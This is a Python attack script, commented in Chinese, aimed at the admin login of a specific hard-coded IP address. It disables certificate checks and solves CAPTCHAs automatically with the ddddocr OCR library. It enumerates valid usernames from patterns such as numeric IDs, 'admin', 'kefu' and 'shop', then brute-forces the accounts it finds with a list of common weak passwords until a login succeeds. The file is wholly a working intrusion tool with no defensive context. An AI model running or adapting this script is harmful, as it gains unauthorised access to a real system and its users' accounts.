#!/usr/bin/env python3
"""数字用户名枚举 + 常见商户ID"""
import urllib.request, http.cookiejar, ssl, sys, time
import ddddocr

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders = [("User-Agent","Mozilla/5.0")]
B = "https://101.201.82.174"
ocr = ddddocr.DdddOcr(show_ad=False)

def get_captcha():
    try:
        r = op.open(f"{B}/customer/admin/verify.html", timeout=10)
        return r.read()
    except Exception:
        return None

def login_raw(user, pwd, code):
    data = f"username={user}&password={pwd}&verify={code}".encode()
    try:
        r = op.open(urllib.request.Request(f"{B}/customer/admin/dologin.html", data=data), timeout=10)
        return r.read().decode("utf-8","ignore")
    except Exception:
        return "HTTP500"

def probe(user, pwd="x", max_attempts=6):
    for i in range(max_attempts):
        cap = get_captcha()
        if cap is None: time.sleep(1); continue
        try: code = ocr.classification(cap)
        except Exception: continue
        if len(code) != 4: continue
        r = login_raw(user, pwd, code)
        if "验证码" in r: continue
        if "HTTP500" in r: return "NONE"
        return r
        time.sleep(0.1)
    return "VERIFY_FAIL"

# 数字ID + 常见商户格式
users = []
for i in range(1, 101):
    users.append(str(i))
for i in range(10000, 10100):
    users.append(str(i))
for i in range(1000, 1100):
    users.append(str(i))
for i in range(1, 50):
    users.append(f"kefu{i}")
    users.append(f"admin{i}")
    users.append(f"zy{i}")
    users.append(f"shop{i}")
    users.append(f"sh{i}")
    users.append(f"user{i}")
    users.append(f"100{i}")
print(f"字典: {len(users)}", flush=True)

existing = []
for idx, u in enumerate(users):
    r = probe(u)
    if r == "NONE":
        if idx % 50 == 0: print(f"[{idx}] {u}: 不存在", flush=True)
        continue
    if r == "VERIFY_FAIL":
        continue
    print(f"### 存在? {u}: {r[:100]}", flush=True)
    existing.append(u)
    if len(existing) >= 5: break

print(f"候选: {existing}", flush=True)
pwds = ["123456","admin123","12345678","admin888","123123","admin","888888","111111","123456789","a123456"]
for user in existing:
    for pw in pwds:
        r = probe(user, pw)
        if r == "NONE" or r == "VERIFY_FAIL": continue
        if "密码" in r or "账号" in r: continue
        print(f"!!! {user}/{pw}: {r[:100]}", flush=True)
        if '"status":1' in r:
            print(f"!!! 登录成功 {user}/{pw}", flush=True)
            sys.exit(0)
print("DONE")
